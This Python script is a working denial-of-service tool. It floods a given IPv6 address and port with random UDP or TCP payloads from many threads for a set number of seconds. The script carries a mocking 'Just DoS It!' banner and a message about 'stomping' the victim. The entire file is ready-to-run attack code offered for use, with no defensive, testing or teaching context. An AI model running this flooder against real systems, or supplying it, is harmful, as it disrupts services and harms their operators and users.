import os
import sys
import time
import threading
import socket
import random
import string
from urllib.parse import urlparse

def _udp(flag, _min, _max):
    while not flag.is_set():
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            while not flag.is_set():
                payload = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(_min, _max)))
                s.sendto(payload.encode(), (sys.argv[1], int(sys.argv[2])))
            s.close()
        except Exception as e:
            print(e)

def _tcp(flag, _min, _max):
    while not flag.is_set():
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s.connect((sys.argv[1], int(sys.argv[2])))  # Fix: use sys.argv[1] for IP
            while not flag.is_set():
                payload = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(_min, _max)))
                s.send(payload.encode())
            s.close()
        except Exception as e:
            print(e)

def main():
    if sys.platform == 'win32':
        os.system('cls')
    else:
        os.system('clear')
    
    if len(sys.argv) != 7:
        sys.exit("\r\n   Usage: <ipv6_addr> <port> <type:udp/tcp> <range:x-y> <seconds> <threads>\r\n")
    
    print('''\r\n\033[1m\033[37m
                                              ▄▄▀
         ▄▀                              ▄▄█▀▀
       ▄█                          ▄▄▄███▀▀
      ██                      ▄▄▄█████▀▀
     ███               ▄▄▄████████▀▀
    █████        ▄▄▄█████████▀▀
   ████████▄▄▄▄██████████▀▀
   ██████████████████▀▀
    █████████████▀▀
     ▀██████▀▀

             \033[31mNIKE - Just DoS It!\033[37m
''')

    print(f"Stomping the dogshit out of victim for {sys.argv[5]} seconds...CTRL+C to abort!\r\n")
    
    # Parsing range
    _min, _max = sys.argv[4].split('-')
    _min = int(_min)
    _max = int(_max)
    
    stop_flag = threading.Event()

    _thread = []
    
    # Create threads for UDP or TCP
    for i in range(int(sys.argv[6])):
        if sys.argv[3].lower() == 'udp':
            x = threading.Thread(target=_udp, args=(stop_flag, _min, _max))
        else:
            x = threading.Thread(target=_tcp, args=(stop_flag, _min, _max))
        
        _thread.append(x)
        x.start()

    _duration = time.time() + int(sys.argv[5])
    try:
        while time.time() < _duration:
            pass
    except KeyboardInterrupt:
        pass
    
    stop_flag.set()
    
    for y in _thread:
        y.join()

    sys.exit('\r\nDone!\r\n')

if __name__ == '__main__':
    main()
